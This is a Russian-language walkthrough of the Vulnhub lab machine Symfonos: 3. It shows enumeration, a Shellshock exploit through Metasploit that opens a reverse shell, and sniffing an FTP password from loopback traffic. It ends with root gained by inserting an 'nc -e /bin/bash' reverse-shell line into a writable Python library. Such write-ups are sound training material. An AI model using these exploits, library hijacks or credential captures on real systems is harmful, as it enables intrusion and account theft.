# Symfonos: 3
## Vulnhub machine

- Название: Symfonos: 3  
- OS: Linux
- Ресурс: Vulnhub
- Сложность: Intermediate
- Дата релиза: 7.04.20
- Оригинальное описание: 
>Intermediate real life based machine designed to test your skill at enumeration. If you get stuck remember to try different wordlist, avoid rabbit holes and enumerate everything thoroughly. SHOULD work for both VMware and Virtualbox.
For hints you're welcome to contact me via Twitter @zayotic
## Changelog v3.1 - 2020-04-07 v3.0 - 2019-07-20 

## Write-up

```html
┌─[root@parrot]─[/home/user]
└──╼ #nmap -p- -A 192.168.56.125
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-17 06:24 AKDT
Nmap scan report for 192.168.56.125
Host is up (0.00060s latency).
Not shown: 65532 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD 1.3.5b
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 cd:64:72:76:80:51:7b:a8:c7:fd:b2:66:fa:b6:98:0c (RSA)
|   256 74:e5:9a:5a:4c:16:90:ca:d8:f7:c7:78:e7:5a:86:81 (ECDSA)
|_  256 3c:e4:0b:b9:db:bf:01:8a:b7:9c:42:bc:cb:1e:41:6b (ED25519)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Site doesn't have a title (text/html).
MAC Address: 08:00:27:15:DA:33 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.60 ms 192.168.56.125

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.20 seconds
```

>В исходнике есть комент "Can you bust the underworld?", dirb справился лишь с парой директорий:

```html
┌─[root@parrot]─[/home/user]
└──╼ #dirb http://192.168.56.125/ /usr/share/wordlists/dirb/big.txt

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sun May 17 06:26:01 2020
URL_BASE: http://192.168.56.125/
WORDLIST_FILES: /usr/share/wordlists/dirb/big.txt

-----------------

GENERATED WORDS: 20458                                                         

---- Scanning URL: http://192.168.56.125/ ----
+ http://192.168.56.125/cgi-bin/ (CODE:403|SIZE:279)                                         
==> DIRECTORY: http://192.168.56.125/gate/                                                   
+ http://192.168.56.125/server-status (CODE:403|SIZE:279)                                    
                                                                                             
---- Entering directory: http://192.168.56.125/gate/ ----
                                                                                             
-----------------
END_TIME: Sun May 17 06:26:48 2020
DOWNLOADED: 40916 - FOUND: 2
```

>Для дальнейшнего я использовал dirbuster:

```html
Dir found: /cgi-bin/underworld/ - 200
```

```html
┌─[✗]─[root@parrot]─[/home/user]
└──╼ #curl http://192.168.56.125/cgi-bin/underworld/
 12:43:08 up 24 min,  0 users,  load average: 6.00, 16.89, 9.48
```

>При попытке обращения к cgi-bin мы получали 403, а к /cgi-bin/underworld/ - 200.
>Далее я искал какие либо уязвимости, связанные с CGI и нашел -- https://ru.wikipedia.org/wiki/Bashdoor#CGI-атака_на_веб-сервера

```html
┌─[root@parrot]─[/home/user]
└──╼ #msfconsole
                                                  
     ,           ,
    /             \
   ((__---,,,---__))
      (_) O O (_)_________
         \ _ /            |\
          o_o \   M S F   | \
               \   _____  |  *
                |||   WW|||
                |||     |||


       =[ metasploit v5.0.88-dev                          ]
+ -- --=[ 2014 exploits - 1097 auxiliary - 343 post       ]
+ -- --=[ 562 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 7 evasion                                       ]

Metasploit tip: View advanced module options with advanced

msf5 > search shellshock

Matching Modules
================

   #   Name                                               Disclosure Date  Rank       Check  Description
   -   ----                                               ---------------  ----       -----  -----------
   0   auxiliary/scanner/http/apache_mod_cgi_bash_env     2014-09-24       normal     Yes    Apache mod_cgi Bash Environment Variable Injection (Shellshock) Scanner
   1   auxiliary/server/dhclient_bash_env                 2014-09-24       normal     No     DHCP Client Bash Environment Variable Code Injection (Shellshock)
   2   exploit/linux/http/advantech_switch_bash_env_exec  2015-12-01       excellent  Yes    Advantech Switch Bash Environment Variable Code Injection (Shellshock)
   3   exploit/linux/http/ipfire_bashbug_exec             2014-09-29       excellent  Yes    IPFire Bash Environment Variable Injection (Shellshock)
   4   exploit/multi/ftp/pureftpd_bash_env_exec           2014-09-24       excellent  Yes    Pure-FTPd External Authentication Bash Environment Variable Code Injection (Shellshock)
   5   exploit/multi/http/apache_mod_cgi_bash_env_exec    2014-09-24       excellent  Yes    Apache mod_cgi Bash Environment Variable Code Injection (Shellshock)
   6   exploit/multi/http/cups_bash_env_exec              2014-09-24       excellent  Yes    CUPS Filter Bash Environment Variable Code Injection (Shellshock)
   7   exploit/multi/misc/legend_bot_exec                 2015-04-27       excellent  Yes    Legend Perl IRC Bot Remote Code Execution
   8   exploit/multi/misc/xdh_x_exec                      2015-12-04       excellent  Yes    Xdh / LinuxNet Perlbot / fBot IRC Bot Remote Code Execution
   9   exploit/osx/local/vmware_bash_function_root        2014-09-24       normal     Yes    OS X VMWare Fusion Privilege Escalation via Bash Environment Code Injection (Shellshock)
   10  exploit/unix/dhcp/bash_environment                 2014-09-24       excellent  No     Dhclient Bash Environment Variable Injection (Shellshock)
   11  exploit/unix/smtp/qmail_bash_env_exec              2014-09-24       normal     No     Qmail SMTP Bash Environment Variable Injection (Shellshock)
```

>Заполняем:

```html
msf5 > use exploit/multi/http/apache_mod_cgi_bash_env_exec
msf5 exploit(multi/http/apache_mod_cgi_bash_env_exec) > options

Module options (exploit/multi/http/apache_mod_cgi_bash_env_exec):

   Name            Current Setting  Required  Description
   ----            ---------------  --------  -----------
   CMD_MAX_LENGTH  2048             yes       CMD max line length
   CVE             CVE-2014-6271    yes       CVE to check/exploit (Accepted: CVE-2014-6271, CVE-2014-6278)
   HEADER          User-Agent       yes       HTTP header to use
   METHOD          GET              yes       HTTP method to use
   Proxies                          no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                           yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:path'
   RPATH           /bin             yes       Target PATH for binaries used by the CmdStager
   RPORT           80               yes       The target port (TCP)
   SRVHOST         0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
   SRVPORT         8080             yes       The local port to listen on.
   SSL             false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                          no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI                        yes       Path to CGI script
   TIMEOUT         5                yes       HTTP read response timeout (seconds)
   URIPATH                          no        The URI to use for this exploit (default is random)
   VHOST                            no        HTTP server virtual host


Exploit target:

   Id  Name
   --  ----
   0   Linux x86

msf5 exploit(multi/http/apache_mod_cgi_bash_env_exec) > set RHOSTS 192.168.56.125
RHOSTS => 192.168.56.125
msf5 exploit(multi/http/apache_mod_cgi_bash_env_exec) > set TARGETURI /cgi-bin/underworld/
TARGETURI => /cgi-bin/underworld/
msf5 exploit(multi/http/apache_mod_cgi_bash_env_exec) > run

[*] Started reverse TCP handler on 192.168.56.119:4444 
[*] Command Stager progress - 100.46% done (1097/1092 bytes)
[*] Sending stage (980808 bytes) to 192.168.56.125
[*] Meterpreter session 1 opened (192.168.56.119:4444 -> 192.168.56.125:56764) at 2020-05-17 07:06:38 -0800
```

>Немного ждем:

```html
meterpreter > ls
Listing: /usr/lib/cgi-bin
=========================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100755/rwxr-xr-x  63    fil   2019-07-19 23:50:59 -0800  underworld
```

>Спавним оболочку:

```html
meterpreter > shell
Process 17227 created.
Channel 2 created.
python3 -c 'import pty; pty.spawn("/bin/bash")'
cerberus@symfonos3:/usr/lib$ id
id
uid=1001(cerberus) gid=1001(cerberus) groups=1001(cerberus),33(www-data),1003(pcap)
```

>Помимо cerberus в системе еще есть юзер hades, и я долго не мог понять, как добраться до него:

```html
cerberus@symfonos3:~$ find / -perm -u=s -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
/usr/sbin/exim4
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/pkexec
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/passwd
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/bin/umount
/bin/mount
/bin/ping
/bin/su
```

>Ни редактирование скриптов, ни подмена passwd, ничего из прошлого опыта. Пришлось лезть за помощью, выяснилось необходимо прослушать один из интерфейсов и разобрать полученный дамп с помощью wireshark:

```html
cerberus@symfonos3://tmp$ tcpdump -D
tcpdump -D
1.enp0s17 [Up, Running]
2.any (Pseudo-device that captures on all interfaces) [Up, Running]
3.lo [Up, Running, Loopback]
4.nflog (Linux netfilter log (NFLOG) interface)
5.nfqueue (Linux netfilter queue (NFQUEUE) interface)
cerberus@symfonos3://tmp$ tcpdump -w 1.pcap -i enp0s17
tcpdump -w 1.pcap -i enp0s17
tcpdump: listening on enp0s17, link-type EN10MB (Ethernet), capture size 262144 bytes
```

>Немного ждем:

```html
cerberus@symfonos3://tmp$ ls
ls
AsxDv  1.pcap
```

>Скачиваем файл на локальную машину:

```html
cerberus@symfonos3://tmp$ python -m SimpleHTTPServer
python -m SimpleHTTPServer
Serving HTTP on 0.0.0.0 port 8000 ...
192.168.56.119 - - [17/May/2020 13:50:37] "GET /1.pcap HTTP/1.1" 200 -
```

>И выясняется, что в нем нет ничего полезного, совсем. Тогда я повторил проделанное, но с интерфейсом lo. Ковыряя пакеты в wireshark, можно найти интересное:

```html
Frame 54: 89 bytes on wire (712 bits), 89 bytes captured (712 bits)
Ethernet II, Src: 00:00:00_00:00:00 (00:00:00:00:00:00), Dst: 00:00:00_00:00:00 (00:00:00:00:00:00)
Internet Protocol Version 4, Src: 127.0.0.1, Dst: 127.0.0.1
Transmission Control Protocol, Src Port: 45900, Dst Port: 21, Seq: 13, Ack: 89, Len: 23
File Transfer Protocol (FTP)
    PASS PTpZTfU4vxgzvRBE\r\n
        Request command: PASS
        Request arg: PTpZTfU4vxgzvRBE
[Current working directory: ]
```

>Логинимся как hades:

```html
┌─[✗]─[user@parrot]─[~]
└──╼ $ssh hades@192.168.56.125
The authenticity of host '192.168.56.125 (192.168.56.125)' can't be established.
ECDSA key fingerprint is SHA256:Q5ddgsdCSuSXrLgf+oVAwhdHy5e7atU6gZzISbrzU94.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.56.125' (ECDSA) to the list of known hosts.
hades@192.168.56.125's password: 
Linux symfonos3 4.9.0-9-amd64 #1 SMP Debian 4.9.168-1+deb9u3 (2019-06-16) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
No mail.
Last login: Mon Apr  6 14:06:02 2020 from 192.168.50.128
hades@symfonos3:~$ id
uid=1000(hades) gid=1000(hades) groups=1000(hades),1002(gods)
```

>Здесь разрешений больше:

```html
hades@symfonos3:~$ find / -writable -type d 2>/dev/null
/srv/ftp
/usr/lib/python2.7
/dev/mqueue
/dev/shm
/sys/fs/cgroup/systemd/user.slice/user-1000.slice/user@1000.service
/sys/fs/cgroup/systemd/user.slice/user-1000.slice/user@1000.service/init.scope
/var/lib/php/sessions
/var/tmp
/run/user/1000
/run/user/1000/gnupg
/run/user/1000/systemd
/run/user/1000/systemd/transient
/run/lock
/home/hades
/home/hades/.nano
/proc/1731/task/1731/fd
/proc/1731/fd
/proc/1731/map_files
/tmp
/tmp/.XIM-unix
/tmp/.font-unix
/tmp/.ICE-unix
/tmp/.Test-unix
/tmp/.X11-unix
```

>Как было видно из скана nmap, на сервере крутится ftp. Я пытался заменить и редактировать файл "ftpclient.py":

```html
hades@symfonos3://opt/ftpclient$ wget http://192.168.56.119:8000/ftpclient.py
--2020-05-17 15:21:47--  http://192.168.56.119:8000/ftpclient.py
Connecting to 192.168.56.119:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 71 [text/plain]
ftpclient.py.1: Permission denied

Cannot write to ‘ftpclient.py.1’ (Permission denied).
```

>Ковыряясь в /usr/lib/python2.7/ я обнаружил файл "ftplib.py", который я мог редактировать, но я был неуверен, что это сработает. Я вписал строку в файл и запустил слушатель:

```html
hades@symfonos3://usr/lib/python2.7$ nano ftplib.py
import os
import sys

# Import SOCKS module if it exists, else standard socket module socket
try:
    import SOCKS; socket = SOCKS; del SOCKS # import SOCKS as socket
    from socket import getfqdn; socket.getfqdn = getfqdn; del getfqdn
except ImportError:
    import socket
from socket import _GLOBAL_DEFAULT_TIMEOUT

__all__ = ["FTP","Netrc"]

# Magic number from socket.h
MSG_OOB = 0x1                           # Process data out of band


# The standard FTP server control port
FTP_PORT = 21
# The sizehint parameter passed to readline() calls
MAXLINE = 8192

os.system("nc -e /bin/bash 192.168.56.119 4444")

# Exception raised when an error or invalid response is received
class Error(Exception): pass
class error_reply(Error): pass          # unexpected [123]xx reply
class error_temp(Error): pass           # 4xx errors
class error_perm(Error): pass           # 5xx errors
class error_proto(Error): pass          # response does not begin with [1-5]
```

>А на локальной машине:

```html
┌─[user@parrot]─[~]
└──╼ $nc -lvp 4444
listening on [any] 4444 ...
```

>Спустя некоторое время, получаем root:

```html
┌─[user@parrot]─[~]
└──╼ $nc -lvp 4444
listening on [any] 4444 ...
192.168.56.125: inverse host lookup failed: Host name lookup failure
connect to [192.168.56.119] from (UNKNOWN) [192.168.56.125] 54292
ls
proof.txt
id
uid=0(root) gid=0(root) groups=0(root)
cat proof.txt

	Congrats on rooting symfonos:3!
                                        _._
                                      _/,__\,
                                   __/ _/o'o
                                 /  '-.___'/  __
                                /__   /\  )__/_))\
     /_/,   __,____             // '-.____|--'  \\
    e,e / //  /___/|           |/     \/\        \\
    'o /))) : \___\|          /   ,    \/         \\
     -'  \\__,_/|             \/ /      \          \\
             \_\|              \/        \          \\
             | ||              <    '_    \          \\
             | ||             /    ,| /   /           \\
             | ||             |   / |    /\            \\
             | ||              \_/  |   | |             \\
             | ||_______________,'  |__/  \              \\
              \|/_______________\___/______\_             \\
               \________________________     \__           \\        ___
                  \________________________    _\_____      \\ _____/
                     \________________________               \\
        ~~~~~~~        /  ~~~~~~~~~~~~~~~~~~~~~~~~~~~  ~~ ~~~~\\~~~~
            ~~~~~~~~~~~~~~    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~    //

	Contact me via Twitter @zayotic to give feedback!
```
